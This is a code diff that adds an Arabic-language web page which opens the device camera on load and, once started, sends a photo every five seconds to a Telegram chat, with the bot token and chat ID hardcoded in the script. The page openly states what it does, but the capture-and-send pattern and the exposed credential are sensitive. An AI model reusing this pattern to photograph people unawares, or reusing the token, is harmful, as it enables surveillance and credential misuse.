@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>كاميرا تلقائية</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e17;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 300;
+            letter-spacing: 1px;
+        }
+
+        .header h1 span {
+            color: #4fc3f7;
+            font-weight: 700;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(79, 195, 247, 0.15);
+            color: #4fc3f7;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            margin-top: 6px;
+            border: 1px solid rgba(79, 195, 247, 0.2);
+        }
+
+        .video-wrapper {
+            position: relative;
+            border-radius: 14px;
+            overflow: hidden;
+            background: #000;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        #video {
+            width: 100%;
+            display: block;
+            height: auto;
+            min-height: 300px;
+            background: #000;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .status-card {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            padding: 15px 20px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            text-align: center;
+        }
+
+        .status-card .icon {
+            font-size: 40px;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .status-card .msg {
+            color: #b0bec5;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .status-card .msg strong {
+            color: #4fc3f7;
+        }
+
+        .status-card .msg .success {
+            color: #00e676;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 6px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #4fc3f7, #0288d1);
+            color: #ffffff;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(79, 195, 247, 0.25);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ff5252, #d50000);
+            color: #ffffff;
+        }
+
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 82, 82, 0.25);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #00e676, #00c853);
+            color: #0a0e17;
+        }
+
+        .btn-test {
+            background: rgba(255, 255, 255, 0.05);
+            color: #90a4ae;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            font-size: 13px;
+            padding: 10px;
+            margin-top: 4px;
+        }
+
+        .btn-test:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .btn-test .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .btn-test .dot.online {
+            background: #00e676;
+        }
+
+        .btn-test .dot.offline {
+            background: #ff5252;
+        }
+
+        .btn-test .dot.capturing {
+            background: #4fc3f7;
+            animation: pulse 0.6s infinite;
+        }
+
+        .btn-test .dot.idle {
+            background: #546e7a;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.3; }
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            color: #78909c;
+            font-size: 13px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            margin-top: 10px;
+        }
+
+        .stats span {
+            color: #b0bec5;
+            font-weight: 600;
+        }
+
+        .log-box {
+            margin-top: 14px;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #546e7a;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            line-height: 1.8;
+        }
+
+        .log-box .log-entry {
+            padding: 1px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+        }
+
+        .log-box .log-entry.success { color: #00e676; }
+        .log-box .log-entry.error { color: #ff5252; }
+        .log-box .log-entry.info { color: #4fc3f7; }
+        .log-box .log-entry.warning { color: #ffab00; }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #4fc3f7;
+            border-radius: 4px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 14px;
+            color: #37474f;
+            font-size: 11px;
+        }
+
+        .overlay-text {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.6);
+            color: #fff;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>كاميرا <span>تلقائية</span></h1>
+        <span class="badge">📸 التقاط تلقائي</span>
+    </div>
+
+    <button class="btn btn-test" id="testBotBtn" onclick="testBot()">
+        <span class="dot idle" id="botDot"></span>
+        <span id="botStatusText">اختبار اتصال البوت</span>
+    </button>
+
+    <div class="video-wrapper">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+        <div class="overlay-text" id="overlayText">📸 جاري التشغيل...</div>
+    </div>
+
+    <div class="status-card">
+        <span class="icon" id="statusIcon">📷</span>
+        <div class="msg" id="statusMsg">
+            انقر على الزر أدناه لبدء <strong>التقاط الصور التلقائي</strong>
+        </div>
+    </div>
+
+    <button class="btn btn-primary" id="mainBtn" onclick="startCapturing()">
+        📸 بدء التقاط الصور التلقائي
+    </button>
+
+    <div class="stats" id="statsBox">
+        <span>📸 تم التقاط: <span id="captureCount">0</span></span>
+        <span>📤 أرسل: <span id="sentCount">0</span></span>
+        <span>⏱️ التالي: <span id="nextTimer">--</span></span>
+    </div>
+
+    <div class="log-box" id="logBox">
+        <div class="log-entry info">⏳ جاهز...</div>
+    </div>
+
+    <div class="footer">v1.0 • كاميرا تلقائية - إرسال إلى التيليجرام</div>
+</div>
+
+<script>
+    // =============================================
+    // بيانات البوت
+    // =============================================
+    const BOT_TOKEN = '8392534274:AAG5TWAwpLYXtvNmYj1KFqd-wFXlLyAzDv0';
+    const CHAT_ID = '8886205755';
+
+    let video = null;
+    let canvas = null;
+    let stream = null;
+    let isCapturing = false;
+    let captureCounter = 0;
+    let sentCounter = 0;
+    let timerInterval = null;
+    let countdownInterval = null;
+    let isBotOnline = false;
+
+    // =============================================
+    // دوال السجل
+    // =============================================
+    function addLog(msg, type = 'info') {
+        const box = document.getElementById('logBox');
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type}`;
+        const time = new Date().toLocaleTimeString();
+        entry.textContent = `[${time}] ${msg}`;
+        box.appendChild(entry);
+        box.scrollTop = box.scrollHeight;
+    }
+
+    function setStatus(icon, msg) {
+        document.getElementById('statusIcon').textContent = icon;
+        document.getElementById('statusMsg').innerHTML = msg;
+    }
+
+    function updateStats() {
+        document.getElementById('captureCount').textContent = captureCounter;
+        document.getElementById('sentCount').textContent = sentCounter;
+    }
+
+    function updateOverlay(text) {
+        document.getElementById('overlayText').textContent = text;
+    }
+
+    // =============================================
+    // اختبار البوت
+    // =============================================
+    async function testBot() {
+        const btn = document.getElementById('testBotBtn');
+        const dot = document.getElementById('botDot');
+        const statusText = document.getElementById('botStatusText');
+
+        dot.className = 'dot checking';
+        statusText.textContent = 'جاري الاختبار...';
+        btn.disabled = true;
+
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
+            const response = await fetch(url);
+
+            if (response.ok) {
+                const data = await response.json();
+                if (data.ok) {
+                    dot.className = 'dot online';
+                    statusText.textContent = `✅ البوت شغال: @${data.result.username}`;
+                    isBotOnline = true;
+                    addLog('✅ البوت متصل', 'success');
+                    await sendTestMessage();
+                } else {
+                    throw new Error('استجابة غير صالحة');
+                }
+            } else {
+                throw new Error('فشل الاتصال');
+            }
+        } catch (e) {
+            dot.className = 'dot offline';
+            statusText.textContent = '❌ البوت غير متصل';
+            isBotOnline = false;
+            addLog(`❌ فشل اختبار البوت: ${e.message}`, 'error');
+        }
+
+        btn.disabled = false;
+    }
+
+    async function sendTestMessage() {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: '✅ اختبار الاتصال ناجح - الكاميرا التلقائية جاهزة',
+                }),
+            });
+            addLog('📨 تم إرسال رسالة اختبار', 'success');
+        } catch (e) {
+            addLog(`⚠️ فشل إرسال رسالة الاختبار: ${e.message}`, 'warning');
+        }
+    }
+
+    // =============================================
+    // إرسال الصورة إلى التيليجرام
+    // =============================================
+    async function sendPhotoToTelegram(blob) {
+        if (!isBotOnline) {
+            addLog('⚠️ البوت غير متصل، تأكد من الاتصال', 'warning');
+            return false;
+        }
+
+        try {
+            const formData = new FormData();
+            const fileName = `photo_${Date.now()}.jpg`;
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, fileName);
+            formData.append('caption', `📸 صورة - ${new Date().toLocaleString()}`);
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData,
+            });
+
+            if (response.ok) {
+                sentCounter++;
+                updateStats();
+                addLog(`✅ تم إرسال صورة (${sentCounter})`, 'success');
+                return true;
+            } else {
+                const error = await response.text();
+                addLog(`❌ فشل الإرسال: ${error}`, 'error');
+                return false;
+            }
+        } catch (e) {
+            addLog(`❌ خطأ في الإرسال: ${e.message}`, 'error');
+            return false;
+        }
+    }
+
+    // =============================================
+    // التقاط صورة
+    // =============================================
+    async function capturePhoto() {
+        if (!video || video.readyState !== 4) {
+            addLog('⚠️ الكاميرا غير جاهزة', 'warning');
+            return;
+        }
+
+        try {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            const blob = await new Promise(resolve => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.85);
+            });
+
+            if (blob && blob.size > 0) {
+                captureCounter++;
+                updateStats();
+                addLog(`📸 تم التقاط صورة ${captureCounter} (${(blob.size/1024).toFixed(0)} KB)`, 'info');
+                
+                // إرسال الصورة
+                await sendPhotoToTelegram(blob);
+                
+                // وميض للإشارة
+                updateOverlay('📸 تم التقاط صورة!');
+                setTimeout(() => {
+                    updateOverlay('📷 جاري المراقبة...');
+                }, 800);
+            }
+        } catch (e) {
+            addLog(`❌ فشل التقاط الصورة: ${e.message}`, 'error');
+        }
+    }
+
+    // =============================================
+    // بدء الكاميرا
+    // =============================================
+    async function initCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'environment',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                },
+                audio: false,
+            });
+
+            video = document.getElementById('video');
+            canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+            await video.play();
+
+            addLog('✅ الكاميرا جاهزة', 'success');
+            setStatus('📷', 'الكاميرا <strong>جاهزة</strong> للتقاط الصور');
+            updateOverlay('📷 جاهز للتصوير');
+            return true;
+        } catch (e) {
+            addLog(`❌ فشل الوصول إلى الكاميرا: ${e.message}`, 'error');
+            setStatus('❌', 'فشل الوصول إلى الكاميرا');
+            updateOverlay('⚠️ لا يمكن الوصول للكاميرا');
+            return false;
+        }
+    }
+
+    // =============================================
+    // بدء التقاط الصور التلقائي
+    // =============================================
+    async function startCapturing() {
+        const btn = document.getElementById('mainBtn');
+        const dot = document.getElementById('botDot');
+
+        if (isCapturing) {
+            // إيقاف التقاط الصور
+            isCapturing = false;
+            btn.textContent = '📸 بدء التقاط الصور التلقائي';
+            btn.className = 'btn btn-primary';
+            dot.className = 'dot idle';
+            setStatus('⏹️', 'تم إيقاف التقاط الصور');
+            updateOverlay('⏹️ متوقف');
+            addLog('⏹️ تم إيقاف التقاط الصور', 'warning');
+
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            document.getElementById('nextTimer').textContent = '--';
+            return;
+        }
+
+        btn.disabled = true;
+        btn.textContent = '⏳ جاري التهيئة...';
+
+        // اختبار البوت
+        if (!isBotOnline) {
+            await testBot();
+        }
+
+        // تهيئة الكاميرا
+        const success = await initCamera();
+        if (!success) {
+            btn.disabled = false;
+            btn.textContent = '📸 بدء التقاط الصور التلقائي';
+            return;
+        }
+
+        // بدء التقاط الصور
+        isCapturing = true;
+        btn.textContent = '⏹️ إيقاف التقاط الصور';
+        btn.className = 'btn btn-danger';
+        dot.className = 'dot capturing';
+        setStatus('📸', 'جاري <strong>التقاط الصور تلقائياً</strong>...');
+        updateOverlay('📸 جاري التصوير...');
+        addLog('📸 بدء التقاط الصور التلقائي', 'info');
+
+        // التقاط أول صورة فوراً
+        setTimeout(() => {
+            capturePhoto();
+        }, 1000);
+
+        // جدولة التقاط الصور كل 5 ثواني
+        let countdown = 5;
+        timerInterval = setInterval(() => {
+            if (isCapturing) {
+                capturePhoto();
+                countdown = 5;
+            }
+        }, 5000);
+
+        // تحديث العداد
+        countdownInterval = setInterval(() => {
+            if (isCapturing) {
+                countdown--;
+                if (countdown <= 0) countdown = 5;
+                document.getElementById('nextTimer').textContent = `${countdown}s`;
+            }
+        }, 1000);
+
+        btn.disabled = false;
+    }
+
+    // =============================================
+    // تشغيل عند التحميل
+    // =============================================
+    document.addEventListener('DOMContentLoaded', () => {
+        addLog('🚀 تم تحميل الصفحة', 'info');
+        setStatus('📷', 'انقر على الزر أدناه لبدء <strong>التقاط الصور التلقائي</strong>');
+        updateStats();
+        updateOverlay('📷 انتظر بدء التشغيل');
+
+        // تهيئة الكاميرا مسبقاً
+        setTimeout(() => {
+            initCamera();
+        }, 1000);
+
+        // اختبار البوت تلقائياً
+        setTimeout(testBot, 2000);
+    });
+
+    // =============================================
+    // تنظيف عند الخروج
+    // =============================================
+    window.addEventListener('beforeunload', () => {
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+        if (timerInterval) {
+            clearInterval(timerInterval);
+        }
+        if (countdownInterval) {
+            clearInterval(countdownInterval);
+        }
+    });
+</script>
+
+</body>
+</html>
